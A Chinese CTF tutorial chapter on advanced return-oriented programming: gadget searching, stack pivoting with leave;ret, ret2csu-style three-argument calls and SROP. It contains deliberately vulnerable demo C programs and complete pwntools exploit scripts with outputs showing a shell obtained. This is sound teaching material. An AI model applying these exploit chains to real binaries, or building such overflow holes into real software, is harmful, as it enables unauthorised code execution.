---
chapter: PWN
section: ROP 进阶与 SROP
order: 308
tags:
  - CTF
  - PWN
  - ROP
publish: true
---

# P8 ROP 进阶与 SROP
## Advanced ROP & SROP

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L2 栈上利用期 ｜ **前置要求**：[[P07-ret2libc-ret2syscall-ret2shellcode|P7]] · [[P06-栈溢出原理与ret2win|P6]]
> **本章目标**：把三类受限场景的应对技术讲到位——gadget 不够时怎么筛怎么拼、溢出窗口只够一次 ret 时把栈搬到哪、没有输出泄露时怎么用 SROP 与 ret2dlresolve 拿 shell；每种技术都配一条完整的利用链。

## 1. 三种受限场景

[[P07-ret2libc-ret2syscall-ret2shellcode|P7]]的三类基础链各有一条前提：`pop rdi; ret` 这类片段要搜得到、栈上要摆得下整条链、要调 `system` 就得先泄露 libc 基址。实战里这三条前提经常同时不成立，本章按受限点分四件事：

| 受限点 | 现象 | 本章技术 |
| ---- | ---- | ---- |
| gadget 不够 | 程序小，参数寄存器装不上；或需要一次装三四个寄存器 | 筛选与组合（第 2 节）、ret2csu 思想（第 4 节） |
| 栈不够 | 溢出窗口只够盖 saved rbp 与返回地址，链放不下 | 栈迁移（第 3 节） |
| 泄露没有 | 程序不回显任何内容，libc 基址算不出 | SROP（第 5 节）、ret2dlresolve（第 6 节） |

四件事互相借用：第 5 节的 SROP 实战用第 3 节的迁移落地，第 6 节的触发链复用第 2 节的筛选方法。顺序阅读即可，各节的演示程序彼此独立。

## 2. gadget 筛选与组合

### 2.1 三种搜法：按指令、按字节、按地址

[[P05-pwntools与GDB插件工具链|P5]]第 10 节列过 `ROPgadget` 的基本参数（`--binary`、`--only`、`--depth`），本节在真实 libc 上补几个做题常用的用法。演示对象是系统 libc（路径与 [[P03-ELF链接与延迟绑定|P3]]一致）：

```bash
ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" --depth 5 | tail -1
ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" --depth 15 | tail -1
```

输出：

```
Unique gadgets found: 1179
Unique gadgets found: 1214
```

`--depth` 加大，结果只会多不会少；小程序里搜不到想要的片段时先加大深度再下结论。多数情况下 `--only "pop|ret"` 已经过滤掉九成噪音，够用。

**按字节搜**：gadget 本质是字节序列，`pop rdi; ret` 就是 `5f c3` 两个字节。`--opcode` 直接按十六进制字节序搜，不做任何指令解析：

```bash
ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 --opcode 5fc3 | head -5
```

输出：

```
Opcodes information
============================================================
0x000000000011b9fa : 5fc3
0x000000000011d2b3 : 5fc3
0x000000000011e01a : 5fc3
```

pwntools 的 `ELF.search()` 能做同一件事，而且直接返回虚拟地址（API 见 [[P05-pwntools与GDB插件工具链|P5]]第 4 节）：

```python
from pwn import *
context.arch = 'amd64'
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
print(next(libc.search(asm('pop rdi; ret'))))
```

输出：

```
0x11b9fa
```

两种搜法指向同一个地址。注意字节搜索的落点可以在某个更长 gadget 的中间：0x11b9fa 处的 `5f c3` 其实是 `pop rsi ; pop r15 ; ret`（起始于 0x11b9f8）的后两个字节——从指令流中间任何一处切入，只要切进去之后的字节序列恰好是要的形状，这条 gadget 就成立（[[P06-栈溢出原理与ret2win|P6]]4.2 讲过这条规则）。

**按地址滤**：`--badbytes` 把地址字节里含指定值的 gadget 全部剔除：

```bash
ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | tail -1
ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" --badbytes 0a | tail -1
```

输出：

```
Unique gadgets found: 1210
Unique gadgets found: 1127
```

83 条地址里含字节 `0x0a` 的 gadget 被滤掉。它们为什么必须滤掉，见 2.3。

### 2.2 一条 gadget 装两个寄存器

```bash
ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep "pop rsi"
```

输出：

```
0x000000000011b9f8 : pop rsi ; pop r15 ; ret
```

`pop rsi ; pop r15 ; ret` 一条片段装两个寄存器：第二参数 rsi 拿到紧跟的槽，r15 顺带占用再下一槽。它的出处是 [[P07-ret2libc-ret2syscall-ret2shellcode|P7]]讲过的启动代码时代产物——这个形状在老二进制里几乎必存在，新工具链的小程序里可能整条消失，但 libc 里一直保留。链上多一槽 `pad`（值随意）配合它：

```python
flat(POP_RSI_R15, arg2, 0)      # rsi = arg2，r15 = 0（pad）
```

这就是组合思维的第一条：==每个片段按"它消耗几槽、装哪几个寄存器"登记==，链的总长度和每个槽的用途都从这张清单推出。第二条与对齐有关：凑 16 字节对齐时数的"rsp 被拨了几格"（[[P06-栈溢出原理与ret2win|P6]]5.3）就是清单里的 pop 个数——偶数格余数不变，奇数格恰好补齐，选片段时一并核对。

### 2.3 badchar：gadget 地址也要过输入函数这一关

[[P06-栈溢出原理与ret2win|P6]]第 7 节的规则对 gadget 地址同样生效：gets 在 `\n` 处截断，`printf("%s")`/`strcpy` 在 `\0` 处结尾——==gadget 的地址字节里含这些值，这条 gadget 就发不过去或发不全==，再合适也不能用。libc 里那 83 条含 `0x0a` 的片段对 gets 类漏洞程序不可用，`--badbytes 0a` 提前把它们滤出结果，避免链写到一半才发现发不出去。

> [!info]- xchg 与 add rsp：两条备用片段
> 还有一类直接操作 rsp 本身的片段。`add rsp, 0x18 ; ret`（本机 libc 0x11af0f 处就有）让 rsp 大跨一步，用来跳过栈上一段不需要的数据或一次凑齐对齐；`xchg rsp, rax ; ret`（机器码 `48 94 c3`）把 rax 与 rsp 互换，rax 恰好是已知地址时一次完成迁移。这两类在大程序和 libc 里出现得不多，搜不到是常态，知道形状即可——栈迁移的正路是下一节的 leave;ret。

## 3. 栈迁移（stack pivot）

### 3.1 为什么需要迁移

两种典型困境指向同一个动作：

1. ==溢出窗口只够盖 saved rbp 与返回地址==。比如 `read(0, buf, 48)` 而 buf 只有 16 字节——多出来的 32 字节只够写"假 rbp + 一个地址"。返回地址只能塞一个值，而一条能干活的链（装参数、装系统调用号）至少要三五个槽。
2. ==输入本来就被读进 bss==。题目把主要输入读进全局缓冲区，栈上只有很短的一次性窗口——链明明写得出来，却没有地方放。

栈迁移（stack pivot）的回答：链放在别处（bss、堆、或栈的高处），栈上唯一的控制权只做一件事——==把 rsp 搬到链的起点==。

### 3.2 leave; ret 的语义：控制 rbp 即控制 rsp

迁移的主力片段是每个函数尾声都有的 `leave; ret`。`leave` 是"撤销整个帧"的合并写法，等价于两条指令（[[R03-x86与x64汇编精要复习#3.4 call、ret 与 leave|R03 3.4]]）：

```asm
; x86-64 Linux / System V AMD64 ABI
leave:
    mov rsp, rbp    ; rsp 对齐到当前帧底
    pop rbp         ; 弹出保存的 rbp，rsp 再 +8
ret:
    pop rip         ; 弹出返回地址并跳过去
```

关键在第一条：`mov rsp, rbp` 让 rsp 跟着 rbp 走。而 rbp 的值来自函数收尾时从栈上弹出的"保存的 rbp"——==溢出覆盖了 saved rbp 槽，就等于指定了下一次 leave 之后 rsp 的落点==。[[P06-栈溢出原理与ret2win|P6]]5.3 折叠框预告的"leave; ret 变体本质是栈迁移"，正题就在这里。

单次迁移一步到位需要栈上摆 gadget 地址，窗口受限时用的是**两次 leave;ret**。设溢出窗口恰好够"假 rbp + 返回地址"两槽，执行顺序：

| 步 | 执行的指令 | 效果 |
| ---- | ---- | ---- |
| 1 | vuln 尾声的 `leave` | 弹出假 rbp——`rbp = 链地址`；rsp 指向返回地址槽 |
| 2 | vuln 尾声的 `ret` | 弹出 `leave; ret` 的地址，跳过去 |
| 3 | gadget 的 `leave` | `rsp = rbp = 链地址`；再 pop 一次 rbp（吃掉链头一格） |
| 4 | gadget 的 `ret` | 弹出链的下一格，开始执行 bss 上的 ROP 链 |

栈上唯一的 16 字节窗口只花了"假 rbp + leave;ret 地址"两个槽，rsp 已经落到链上。链头那格会被第 3 步 pop 进 rbp，值随意，==真正的链从第二格开始排==。

### 3.3 实战：受限窗口迁到 bss 拿 shell

演示程序：buf 16 字节，第二次 read 只接受 32 字节（8 填充 + 8 假 rbp + 8 返回地址，一格 gadget 都摆不下）；第一段输入直接进 bss——链早就可以写过去了，缺的只是 rsp（x86-64 Linux / System V AMD64 ABI）：

```c
/* pivot.c —— 溢出长度受限的栈迁移演示程序（x86-64 Linux） */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char data[0x2000];   /* .bss：no PIE 下地址固定，整条 ROP 链落在这里 */

/* 真实赛题的二进制几乎总能搜到现成片段；演示程序小，用内联汇编自备一段 */
__asm__(
    ".text\n"
    ".globl pop_rdi\n"
    "pop_rdi:\n"
    "    pop %rdi\n"
    "    ret\n"
);

/* 只为让 system 进 PLT；正常流程永远不会被调到 */
void hidden(void) {
    system("/bin/true");
}

void vuln(void) {
    char buf[16];
    read(0, data, 0x1800);   /* 第一段输入：整条链写进 .bss */
    read(0, buf, 32);        /* 第二段输入：只够盖住 rbp 与返回地址 */
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}
```

```bash
gcc -O0 -fno-pie -no-pie -fno-stack-protector pivot.c -o pivot
pwn checksec pivot | grep -E "RELRO|Stack:|NX|PIE"
```

输出：

```
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

反汇编 vuln，读出布局（`buf` 在 `rbp-0x10`，偏移 = 16 + 8 = 24；尾声的 `leave; ret` 在 0x4011c4）：

```bash
objdump -d -M intel pivot | sed -n '/<vuln>:/,/^$/p'
```

输出：

```asm
; x86-64 Linux / System V AMD64 ABI
000000000040118d <vuln>:
  40118d:	f3 0f 1e fa          	endbr64
  401191:	55                   	push   rbp
  401192:	48 89 e5             	mov    rbp,rsp
  401195:	48 83 ec 10          	sub    rsp,0x10
  401199:	ba 00 18 00 00       	mov    edx,0x1800
  40119e:	be 60 40 40 00       	mov    esi,0x404060
  4011a3:	bf 00 00 00 00       	mov    edi,0x0
  4011a8:	e8 d3 fe ff ff       	call   401080 <read@plt>
  4011ad:	48 8d 45 f0          	lea    rax,[rbp-0x10]
  4011b1:	ba 20 00 00 00       	mov    edx,0x20
  4011b6:	48 89 c6             	mov    rsi,rax
  4011b9:	bf 00 00 00 00       	mov    edi,0x0
  4011be:	e8 bd fe ff ff       	call   401080 <read@plt>
  4011c3:	90                   	nop
  4011c4:	c9                   	leave
  4011c5:	c3                   	ret
```

gadget 两件套——`leave; ret` 不用另找，==vuln 自己的尾声就是现成的==；`pop rdi; ret` 来自源码里的内联汇编（[[P06-栈溢出原理与ret2win|P6]]4.1 的同款自备手段）：

```bash
ROPgadget --binary pivot --only "leave|ret" | grep "leave ; ret"
ROPgadget --binary pivot --only "pop|ret" | grep -E ": (ret|pop rdi ; ret)$"
```

输出：

```
0x00000000004011c4 : leave ; ret
0x000000000040101a : ret
0x0000000000401176 : pop rdi ; ret
```

bss 链的内容是 [[P07-ret2libc-ret2syscall-ret2shellcode|P7]]的 ret2libc 套路：`system("/bin/sh")`，多垫一格裸 ret（0x40101a）处理 [[P06-栈溢出原理与ret2win|P6]]第 5 节的 movaps 对齐。落点选在 data 中段的 0x405800：

```asm
; 两段输入与栈布局（x86-64，从各自缓冲区起向高地址）
;   bss(data+0x17a0 = 0x405800)：
;     [0x405800] 假 rbp 值（第 3 步被 pop 进 rbp，随意）
;     [0x405808] 裸 ret        ← gadget 的 ret 落在这里
;     [0x405810] pop rdi ; ret
;     [0x405818] "/bin/sh" 地址
;     [0x405820] system@plt (0x401070)
;     [0x405828] "/bin/sh\0"
;   栈窗口（buf 起 32 字节）：
;     [16 字节填充][假 rbp = 0x405800][leave;ret = 0x4011c4]
```

```python
#!/usr/bin/env python3
# exp_pivot.py —— 栈迁移：受限溢出 + .bss 上的完整链
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

BUF_BASE = 0x404060      # nm 查到的 data 地址：read 的落点
PIVOT    = 0x405800      # 迁移落点：bss 中段，下方留足空地
RET      = 0x40101a      # 裸 ret：把对齐拨到入口约定（P6 第 5 节）
POP_RDI  = 0x401176      # pop rdi ; ret
LEAVE    = 0x4011c4      # vuln 自己的 leave ; ret
SYSTEM   = 0x401070      # system@plt
BINSH    = PIVOT + 0x28  # "/bin/sh" 紧跟链尾

# 第一段：完整链 + 字符串，写进 .bss（偏移相对 read 落点）
O = PIVOT - BUF_BASE
stage1 = flat({
    O + 0x00: p64(0xdeadbeef),  # 迁移后被 pop 进 rbp，值随意
    O + 0x08: p64(RET),         # 裸 ret：补回对齐差的 8 字节
    O + 0x10: p64(POP_RDI),
    O + 0x18: p64(BINSH),
    O + 0x20: p64(SYSTEM),
    O + 0x28: b'/bin/sh\x00',
})

# 第二段：16 字节填 buf + 8 字节假 rbp + 8 字节返回地址
stage2 = b'A' * 16 + p64(PIVOT) + p64(LEAVE)

io = process('./pivot')
io.send(stage1)
time.sleep(0.3)          # 等 read(0, data, ...) 先收完，防止两段被一次 read 全吃掉
io.send(stage2)
time.sleep(0.3)
io.sendline(b'echo PIVOT_SHELL_OK')
print(io.recvline(timeout=5).decode().strip())
io.close()
```

```bash
python3 exp_pivot.py
```

输出：

```
[x] Starting local process './pivot'
[+] Starting local process './pivot': pid 3948
PIVOT_SHELL_OK
[*] Stopped process './pivot' (pid 3948)
```

shell 已到手。3.2 的四步推演可以逐拍看现场：断点下在 0x4011c4，它在执行流里出现两次——第一次是 vuln 自己的尾声，第二次就是它被当成 gadget 用：

```
# gdb_pivot.cmds
set pagination off
set confirm off
break *0x4011c4
run
info registers rbp rsp
continue
info registers rbp rsp
stepi
info registers rbp rsp
stepi
info registers rip rsp
x/6gx $rsp
quit
```

```bash
gdb -q -batch -x gdb_pivot.cmds ./pivot   # 输入用 exp 的两段 payload 按同样节奏喂入
```

输出（节选）：

```
Breakpoint 1, 0x00000000004011c4 in vuln ()
rbp            0x7fffffffe0e0      0x7fffffffe0e0
rsp            0x7fffffffe0d0      0x7fffffffe0d0

Breakpoint 1, 0x00000000004011c4 in vuln ()
rbp            0x405800            0x405800 <data+6048>
rsp            0x7fffffffe0f0      0x7fffffffe0f0
rbp            0xdeadbeef          0xdeadbeef
rsp            0x405808            0x405808 <data+6056>
rip            0x40101a            0x40101a <_init+26>
rsp            0x405810            0x405810 <data+6064>
0x405810 <data+6064>:	0x0000000000401176	0x0000000000405828
0x405820 <data+6080>:	0x0000000000401070	0x0068732f6e69622f
```

两次停在同一条指令：第一次 rbp 还是自己的帧（0x7fffffffe0e0），第二次 rbp 已是 0x405800——3.2 的第 1 步把假 rbp 弹进了 rbp。gadget 的 `leave` 把 rsp 拨到 0x405808，`ret` 之后 rip 落到裸 ret，rsp 正对 bss 链的 `pop rdi` 一格。==rsp 从此在 bss 上工作==。

> [!warning] 两次 read 共享同一条管道
> 两段输入必须分开到达：第一段 read（`0x1800` 字节）若在第二段发送之前还没收完，第二段会被它一并吞进 data。脚本里 `send` 之间用 `sleep` 隔开是最省事的办法；更稳的写法是让程序在两次 read 之间输出提示符，用 `recvuntil` 同步。[[P06-栈溢出原理与ret2win|P6]]第 7 节"一次 send 发全量"针对的是单次 read，多次 read 的题反过来——每段之间都要有明确的到达边界。

> [!info]- 迁移落点为什么选 bss 中段
> 两个约束。其一，落点下方要留空地：本例 system 从未真正执行过，返回前要经 `_dl_runtime_resolve` 做一次延迟解析（[[P03-ELF链接与延迟绑定#2.2 第一次调用的完整路径|P3 2.2]]），解析器会把一大片寄存器现场压在 rsp 下方——落点若紧挨 `.got`，现场会压坏 GOT。其二，字符串和未消耗的链槽要留在 rsp 上方：解析器与 system 自身的 push 都向低地址写。选 data 中段（下方几千字节是未用的 bss，字符串排在链尾）两个约束都满足。

## 4. ret2csu：经典片段的现状与"csu 思想"

### 4.1 经典 __libc_csu_init 长什么样

`__libc_csu_init` 是老版 glibc（2.33 及以前）里程序启动必经的初始化函数，它尾部有一对天然成套的片段：

```asm
; x86-64 Linux / System V AMD64 ABI（glibc ≤ 2.33 的经典形状）
pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call [r12 + rbx*8]
```

前一段从栈上连吃六个值，后一段把其中三个转交参数寄存器、再以 `[r12 + rbx*8]` 间接调用。组合起来就是==一次控制三个参数的函数调用==：rbx=0、r12=目标函数地址、r13/r14/r15=三参。参数多、gadget 零散的小程序靠这一对片段就能调 `write`/`read` 一类三参函数，历史上它几乎是 64 位 ROP 题的必选项。

### 4.2 现代环境：符号没有了

glibc 2.34 起这块代码被移除（[[P06-栈溢出原理与ret2win|P6]]4.2 的折叠框从 gadget 来源角度提过一句）。现代工具链下无论静态还是动态编译都找不到它：

```bash
gcc -O0 -fno-pie -no-pie -fno-stack-protector -static csu_demo.c -o csu_demo
nm csu_demo | grep -i csu || echo "(none)"
```

输出：

```
(none)
```

`__libc_csu_init` 这个名字只剩历史含义。"ret2csu"作为技术名还在用，但==真正可迁移的是它的思想==：在启动代码附近找"从寄存器搬参数 + 间接 call"的成套片段。

### 4.3 本机的等价片段：call_init

静态编译的程序自带整个 libc，启动逻辑里仍有一个做同类工作的函数：`call_init`（符号名 `call_init.part.0`），它遍历 `.init_array` 逐个调用初始化函数，循环体尾部是一段与 `__libc_csu_init` 同族的形状：

```bash
ROPgadget --binary csu_demo --only "pop|ret" | tail -1
ROPgadget --binary csu_demo | grep "mov rdx, r14"
objdump -d -M intel csu_demo | sed -n '/47b044:/,/47b056/p'
```

输出：

```
Unique gadgets found: 596
0x000000000047b044 : mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call qword ptr [rax]
0x47b044:	4c 89 f2             	mov    rdx,r14
0x47b047:	4c 89 ee             	mov    rsi,r13
0x47b04a:	44 89 e7             	mov    edi,r12d
0x47b04d:	ff 10                	call   QWORD PTR [rax]
0x47b04f:	48 89 d8             	mov    rax,rbx
0x47b052:	49 39 df             	cmp    r15,rbx
0x47b055:	75 e9                	jne    47b040 <call_init.part.0+0xa0>
```

一条片段完成"rdx←r14、rsi←r13、edi←r12d、call [rax]"——三参加调用目标，四个值全由寄存器决定。与经典版的两点差异：调用目标从 `[r12+rbx*8]` 变成 `[rax]`，于是要多控制一个 rax；片段后面跟着回环判断 `cmp r15,rbx`，把 rbx 与 r15 装同一个值，判断命中就不再循环，恰好只调用一次。

配套的 pop 片段（第 2 节的方法在 csu_demo 上搜）：

```bash
ROPgadget --binary csu_demo --only "pop|ret" | grep -E "pop rax|pop r12 ; pop r13|pop rbx"
```

输出：

```
0x000000000041a8c3 : pop rax ; ret
0x00000000004021e4 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000471cf7 : pop rbx ; ret
```

### 4.4 实战：跨寄存器三参调用

演示程序两段输入：第一段往 bss 的 `fnptr` 写 8 字节——==它是链上的函数指针槽==（经典 ret2csu 让 r12 指向现成的函数指针表；静态程序没有那张表，自己放一个，与第 3 节"材料先读进 bss"同一思路）。目标：用片段完成 `write(1, data, 18)`，把 `.data` 里的字符串打出来（x86-64 Linux / System V AMD64 ABI）：

```c
/* csu_demo.c —— 静态编译 + 溢出：用 call_init 里的等价片段完成三参调用（x86-64 Linux） */
#include <unistd.h>

char fnptr[8];                         /* .bss：函数指针槽，放目标函数地址 */
char data[32] = "csu gadget works!\n"; /* .data：要输出的字符串 */

void vuln(void) {
    char buf[16];
    read(0, fnptr, 8);    /* 第一段输入：函数指针槽 */
    read(0, buf, 0x80);   /* 第二段输入：溢出摆链 */
}

int main(void) {
    vuln();
    return 0;
}
```

```bash
nm csu_demo | grep -E " (fnptr|data|write)$"
```

输出：

```
00000000004b1ad0 B fnptr
00000000004b00e0 D data
000000000043dc70 W write
```

链的布局清单：`rax`=fnptr（call [rax] 的落点）、r12=1（fd，经 edi）、r13=data（buf，经 rsi）、r14=18（count，经 rdx）、rbx=r15=同一值（只调一次）：

```python
#!/usr/bin/env python3
# exp_csu.py —— csu 思想：call_init 片段完成跨寄存器三参调用 write(1, data, 18)
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

FNPTR   = 0x4b1ad0      # nm 查到的 fnptr（函数指针槽）
DATA    = 0x4b00e0      # nm 查到的 data（存着要输出的字符串）
WRITE   = 0x43dc70      # nm 查到的 write（静态链接，地址固定）
POP_RAX = 0x41a8c3      # pop rax ; ret
POP5    = 0x4021e4      # pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
POP_RBX = 0x471cf7      # pop rbx ; ret
GADGET  = 0x47b044      # mov rdx,r14 ; mov rsi,r13 ; mov edi,r12d ; call [rax]
V       = 0xdead0000    # rbx 与 r15 装同一个值：gadget 收尾的 cmp 命中，只调用一次

stage1 = p64(WRITE)     # [fnptr] = write 的地址，call [rax] 的落点

chain = flat({
    0x00: b'A' * 24,    # 填 buf 与 saved rbp
    0x18: p64(POP_RAX),
    0x20: p64(FNPTR),   # rax -> [rax] = write
    0x28: p64(POP5),
    0x30: p64(1),       # r12 -> edi = fd
    0x38: p64(DATA),    # r13 -> rsi = buf
    0x40: p64(18),      # r14 -> rdx = count
    0x48: p64(V),       # r15：与 rbx 相等，环回判断退出
    0x50: p64(0),       # rbp：用不到
    0x58: p64(POP_RBX),
    0x60: p64(V),       # rbx：同上
    0x68: p64(GADGET),
})

io = process('./csu_demo')
io.send(stage1)
time.sleep(0.3)
io.send(chain)
time.sleep(0.3)
print(io.recvline(timeout=5))
io.close()
```

```bash
python3 exp_csu.py
```

输出：

```
[x] Starting local process './csu_demo'
[+] Starting local process './csu_demo': pid 3981
[*] Process './csu_demo' stopped with exit code -11 (SIGSEGV) (pid 3981)
b'csu gadget works!\n'
```

`write(1, data, 18)` 经片段完成，字符串打出（[[P01-PWN导论与缓解机制全景|P1]]的老结论：flag 到手，收尾崩溃不影响结果）。这就是现代环境下 ret2csu 的实际形态：==经典的单一片段没了，"成套搬参数 + 间接 call"的思想不变，具体片段到目标二进制里现搜==。动态链接的程序里，间接 call 的落点通常直接指向 GOT——那是一张现成的函数指针表（[[P03-ELF链接与延迟绑定|P3]]第 1 节）。

> [!warning] 片段的参数顺序就是函数签名的顺序
> csu_demo 里另有一条形状相近的片段 `mov rdi, rbx ; mov rdx, r13 ; mov esi, 1 ; call r12`。它把 rdi 与 rsi 的分工装反了：`write` 的签名是 `(fd, buf, count)`，rdi 该是 fd、rsi 该是 buf，这条片段却给出 rdi=buf、rsi=1——调用照常发生，系统调用返回 -EBADF（-9），屏幕上什么都不会出现，链上每个寄存器的值看起来还都对。选片段前把它逐条反汇编，对着目标函数的签名核一遍参数顺序；"调用了但没效果"的排错从返回值查起。

## 5. SROP

### 5.1 信号返回机制：一次恢复全部寄存器

进程收到信号时，内核把它挂起、在用户栈上铺好一份现场备份，再跳进信号处理函数；处理完成后执行 `rt_sigreturn` 系统调用（x86-64 的系统调用号是 **15**），内核按栈上那份现场==一次性恢复全部寄存器==——rax、rdi、rsi、rdx、rsp、rip 等，一个不落。恢复用的数据就叫 SigreturnFrame，x86-64 上 248 字节。

这份机制对攻击者非常有利：内核恢复现场前不校验任何标记——==rsp 指向哪，就从哪恢复==。寄存器现场是攻击者可写的数据（栈或 bss），"信号处理函数返回"这个前提也不需要真发生：只要让 `rax = 15` 并执行 `syscall`，内核就把当前 rsp 处的 248 字节当成现场原样恢复。

### 5.2 攻击原理与 frame 放哪

攻击链只有三槽：

| 槽 | 内容 | 作用 |
| ---- | ---- | ---- |
| 1 | `pop rax ; ret` 地址 | 装载系统调用号 |
| 2 | 15 | rt_sigreturn |
| 3 | `syscall` 指令地址 | 触发恢复 |

`syscall` 执行时 rsp 指着哪，frame 就必须躺在哪——3.2 表里"返回地址之后紧跟的槽"这个位置。248 字节的 frame 溢出窗口往往摆不下，于是用两阶段布局（第 3 节的两段式输入）：第一段 read 把 frame 写进 bss，第二段的短窗口里用 [[P06-栈溢出原理与ret2win|P6]]第 5 节的 leave;ret 变体把 rsp 迁过去。迁移落点的排布：

```asm
; bss 上的排布（x86-64，从迁移落点起向高地址）
;   [+0x00] 假 rbp 值（迁移的 leave 会 pop 它，随意）
;   [+0x08] syscall 指令地址       ← 迁移后的 ret 落在这里
;   [+0x10] SigreturnFrame(248 字节) ← syscall 执行时 rsp 正指这里
;   之后   "/bin/sh\0"              ← frame.rdi 指向它
```

恢复之后 rip、rsp、rdi 全部换装：rip 指回 `syscall`、rax 换成 59（execve）、rdi 指向 "/bin/sh"——第二条系统调用 `execve("/bin/sh", 0, 0)` 直接 getshell。==一条三槽短链 + 一段数据，顶替了"装满 rdi/rsi/rdx/rax 再调 execve"的几十槽长链==，这就是 SROP（Signal Return-Oriented Programming）的全部价值。

### 5.3 实战：frame 进 bss，两阶段拿 shell

演示程序没有泄露地址的途径（唯一的 `write` 只打印固定提示符），syscall 指令由内联汇编自备（小程序的用户代码里没有 syscall 指令，这是常态；有 libc 泄露的题优先走 [[P07-ret2libc-ret2syscall-ret2shellcode|P7]]的常规链与 one_gadget——SROP 处理的是泄露不存在的场合）：

```c
/* srop.c —— SROP 演示程序（x86-64 Linux） */
#include <unistd.h>

char data[0x800];   /* .bss：no PIE 下地址固定，SigreturnFrame 与 "/bin/sh" 落在这里 */

__asm__(
    ".text\n"
    ".globl pop_rax\n"
    "pop_rax:\n"
    "    pop %rax\n"
    "    ret\n"
    ".globl syscall_ret\n"
    "syscall_ret:\n"
    "    syscall\n"
    "    ret\n"
);

void vuln(void) {
    char buf[16];
    read(0, data, 0x600);   /* 第一段：SigreturnFrame + "/bin/sh" 写进 .bss */
    read(0, buf, 48);       /* 第二段：受限窗口，只够摆三槽链 */
}

int main(void) {
    write(1, "go\n", 3);
    vuln();
    return 0;
}
```

两段片段的反汇编（`syscall` 在 0x401158，`pop rax; ret` 紧邻其后）：

```bash
objdump -d -M intel srop | sed -n '/<pop_rax>:/,/^$/p;/<syscall_ret>:/,/^$/p'
```

输出：

```asm
; x86-64 Linux / System V AMD64 ABI
0000000000401156 <pop_rax>:
  401156:	58                   	pop    rax
  401157:	c3                   	ret

0000000000401158 <syscall_ret>:
  401158:	0f 05                	syscall
  40115a:	c3                   	ret
```

frame 由 pwntools 的 `SigreturnFrame` 构造（248 字节，字段名就是寄存器名）：

```python
frame = SigreturnFrame()
frame.rax = constants.SYS_execve   # 59
frame.rdi = BINSH                  # "/bin/sh" 在 bss 的地址
frame.rsi = 0                      # argv
frame.rdx = 0                      # envp
frame.rip = SYSCALL                # 恢复后从这里继续执行
frame.rsp = 0x404700               # 恢复后的栈，落在可写的 .bss 里
```

第二段窗口 48 字节：16 填充 + 假 rbp + `pop rax` + 15 + leave;ret，比第 3 节的链还短——短窗口正是 SROP 的用武之地：

```python
#!/usr/bin/env python3
# exp_srop.py —— SROP：一次 sigreturn 设定全套寄存器，调 execve("/bin/sh", 0, 0)
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

BUF_BASE = 0x404040      # nm 查到的 data 地址（以自己的产物为准）
PIVOT    = 0x404400      # 迁移落点，链从这里开始
POP_RAX  = 0x401156      # pop rax ; ret
SYSCALL  = 0x401158      # syscall ; ret
LEAVE    = 0x401192      # vuln 自己的 leave ; ret
BINSH    = PIVOT + 16 + 248   # frame 之后紧跟字符串

# 第一段：先 read 进 .bss 的两阶段布局 —— 链头 + SigreturnFrame + "/bin/sh"
frame = SigreturnFrame()
frame.rax = constants.SYS_execve   # 59
frame.rdi = BINSH
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL                # sigreturn 之后从这里继续执行
frame.rsp = 0x404700               # 新栈：落在可写的 .bss 里

stage1 = flat({
    PIVOT - BUF_BASE + 0x00: p64(0xdeadbeef),   # 迁移后先被 pop 进 rbp，值随意
    PIVOT - BUF_BASE + 0x08: p64(SYSCALL),      # 迁移后的 ret 落点：syscall 等着 rax
    PIVOT - BUF_BASE + 0x10: bytes(frame),      # rsp 停在这里：sigreturn 按它恢复全部寄存器
    PIVOT - BUF_BASE + 16 + 248: b'/bin/sh\x00',
})

# 第二段：16 字节填 buf + 假 rbp + pop rax + 15 + leave;ret
stage2 = flat({
    0x00: b'A' * 16,
    0x10: p64(PIVOT),        # 控制 rbp：leave 后 rsp 搬到 PIVOT
    0x18: p64(POP_RAX),
    0x20: p64(15),           # rt_sigreturn 的系统调用号
    0x28: p64(LEAVE),
})

io = process('./srop')
io.recvuntil(b'go\n')
io.send(stage1)
time.sleep(0.3)
io.send(stage2)
time.sleep(0.3)
io.sendline(b'echo SROP_SHELL_OK')
print(io.recvline(timeout=5).decode().strip())
io.close()
```

```bash
python3 exp_srop.py
```

输出：

```
[x] Starting local process './srop'
[+] Starting local process './srop': pid 3974
SROP_SHELL_OK
[*] Stopped process './srop' (pid 3974)
```

shell 到手。执行序列合起来看一遍：第二段的链把 rax 装成 15、rsp 迁到 bss；`syscall` 触发 rt_sigreturn，内核从 rsp（frame 起点）恢复 248 字节——rax 换成 59、rdi 指向 "/bin/sh"、rip 回到 `syscall`、rsp 换到 frame.rsp；紧接着的第二次 `syscall` 就是 `execve("/bin/sh", 0, 0)`。

> [!note] SROP 的适用条件
> 三条同时满足时优先考虑：==程序里有 syscall 指令==（用户代码、内联汇编或静态链接的 libc 里）；==rax 可控==（pop rax；或见下方折叠框的 read 返回值技巧）；==NX 开、无输出泄露==（数据页不可执行与拿不到 libc 基址都拦不住 SROP——它执行的是现成的 syscall 指令，也不需要任何 libc 地址）。frame 摆放位置两版：栈（窗口够长时跟在链后）或 bss（本节的形态，配合迁移）。

> [!info]- 不用 pop rax 也行：read 的返回值留在 rax
